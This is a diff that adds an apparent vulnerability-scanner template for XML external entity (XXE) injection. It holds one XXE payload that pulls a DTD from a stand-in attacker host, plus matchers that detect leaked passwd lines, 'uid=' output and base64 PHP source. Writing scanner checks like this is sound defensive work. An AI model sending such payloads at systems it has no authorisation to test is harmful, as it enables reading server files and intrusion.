@@ -1,0 +1,25 @@
+id: xxe5-0725
+name: 'XXE read in item'
+severity: critical
+type: active
+tags:
+  - xxe
+  - injection
+  - xml
+description: 'XXE entity via item'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      item:
+        - '<!DOCTYPE Envelope [<!ENTITY xxe SYSTEM "http://evil.example/x.dtd">]><Envelope>&xxe;</Envelope>'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
+          - 'root:'
+          - 'XXE_OK'
+          - 'localhost'
+          - 'uid='
+          - 'PD9waHA'
